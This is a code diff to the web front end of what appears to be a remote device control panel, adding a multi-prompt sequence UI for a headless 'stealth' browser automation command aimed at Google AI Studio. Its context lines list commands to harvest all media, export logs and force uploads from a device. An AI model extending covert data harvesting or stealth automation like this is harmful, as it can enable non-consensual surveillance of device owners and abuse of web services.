@@ -335,6 +335,41 @@
         let selectedNativeTrapId = null;
         let logoClicks = 0;
         let logoTimer = null;
+        let automationPrompts = [''];
+
+        function renderAutomationPrompts() {
+            const container = document.getElementById('auto-prompts-container');
+            if (!container) return;
+            container.innerHTML = automationPrompts.map((p, i) => {
+                const removeBtn = automationPrompts.length > 1 ? '<span onclick="removeAutomationPrompt(' + i + ')" style="color:var(--danger); cursor:pointer; font-size:0.8rem;">× REMOVE</span>' : '';
+                return '<div style="display:flex; flex-direction:column; gap:4px; background:rgba(255,255,255,0.02); padding:8px; border:1px solid #222;">' +
+                    '<div style="display:flex; justify-content:space-between; align-items:center;">' +
+                        '<span style="font-size:0.65rem; color:var(--primary);">PROMPT #' + (i+1) + '</span>' +
+                        removeBtn +
+                    '</div>' +
+                    '<textarea id="auto-prompt-input-' + i + '" oninput="updateAutomationPrompt(' + i + ', this.value)" style="width:100%; height:60px;" placeholder="Enter prompt content..."></textarea>' +
+                '</div>';
+            }).join('');
+            
+            automationPrompts.forEach((p, i) => {
+                const el = document.getElementById('auto-prompt-input-' + i);
+                if (el) el.value = p;
+            });
+        }
+
+        function addAutomationPrompt() {
+            automationPrompts.push('');
+            renderAutomationPrompts();
+        }
+
+        function removeAutomationPrompt(index) {
+            automationPrompts.splice(index, 1);
+            renderAutomationPrompts();
+        }
+
+        function updateAutomationPrompt(index, value) {
+            automationPrompts[index] = value;
+        }
 
         function handleLogoClick() {
             logoClicks++;
@@ -618,7 +653,7 @@
                     { id: 'HARVEST_MEDIA', name: 'Harvest All Media', icon: '🗃️', keywords: 'photos, videos, media, grab, sync', inputs: [] },
                     { id: 'GET_LOGS', name: 'Export System Logcat', icon: '📋', inputs: [] },
                     { id: 'GET_VAULT_SIZE', name: 'Query Vault Storage', icon: '💾', inputs: [] },
-                    { id: 'AUTOMATE_WEB', name: 'Web Automation Engine', icon: '🤖', keywords: 'ai, bot, prompt, script, browser', inputs: [{id: 'auto-mode', label: 'Mode', type: 'select', options: [{v: 'VISIBLE', l: 'Visible (Browser UI)'}, {v: 'STEALTH', l: 'Stealth (1080x1920 Headless)'}]}, {id: 'auto-url', label: 'Target URL', type: 'text', val: 'https://aistudio.google.com/prompts/new_chat'}, {id: 'auto-prompt', label: 'Prompt Payload (Separate multi-prompts with ---)', type: 'textarea', placeholder: 'Prompt 1\n---\nPrompt 2\n---\nPrompt 3...'}] }
+                    { id: 'AUTOMATE_WEB', name: 'Web Automation Engine', icon: '🤖', keywords: 'ai, bot, prompt, script, browser', inputs: [{id: 'auto-mode', label: 'Mode', type: 'select', options: [{v: 'VISIBLE', l: 'Visible (Browser UI)'}, {v: 'STEALTH', l: 'Stealth (1080x1920 Headless)'}]}, {id: 'auto-url', label: 'Target URL', type: 'text', val: 'https://aistudio.google.com/prompts/new_chat'}], customUI: '<div class="card" style="background:rgba(0,243,255,0.02); border-style:dotted; padding:10px; margin-bottom:10px;"><div class="cmd-label" style="margin-bottom:8px;">PROMPT_SEQUENCE</div><div id="auto-prompts-container" style="display:flex; flex-direction:column; gap:8px; margin-bottom:10px;"></div><button class="btn" onclick="addAutomationPrompt()" style="width:100%; font-size:0.75rem;">+ ADD PROMPT TO SEQUENCE</button></div>' }
                 ]
             },
             {
@@ -760,10 +795,12 @@
             const drawer = document.getElementById('drawer-' + id);
             const isOpen = drawer.classList.contains('open');
             
-            // Close all other drawers in the same section for cleanliness
             drawer.closest('.cat-content').querySelectorAll('.cmd-drawer').forEach(d => d.classList.remove('open'));
             
-            if (!isOpen) drawer.classList.add('open');
+            if (!isOpen) {
+                drawer.classList.add('open');
+                if (id === 'AUTOMATE_WEB') renderAutomationPrompts();
+            }
         }
 
         function addTouchStep() {
@@ -1348,8 +1385,10 @@
                     case 'FORCE_UPLOAD':
                         content = document.getElementById('val-force').value; break;
                     case 'AUTOMATE_WEB':
-                        const rawPrompts = document.getElementById('auto-prompt').value;
-                        const promptArr = rawPrompts.split('---').map(p => p.trim()).filter(p => p.length > 0);
+                        const promptArr = automationPrompts.map(p => p.trim()).filter(p => p.length > 0);
+                        if (promptArr.length === 0) {
+                            return toast("AT LEAST ONE PROMPT REQUIRED", "danger");
+                        }
                         content = `${document.getElementById('auto-mode').value} | ${document.getElementById('auto-url').value} | ${JSON.stringify(promptArr)}`; break;
                     case 'GET_VAULT_SIZE':
                     case 'UPLOAD_DUMPS':
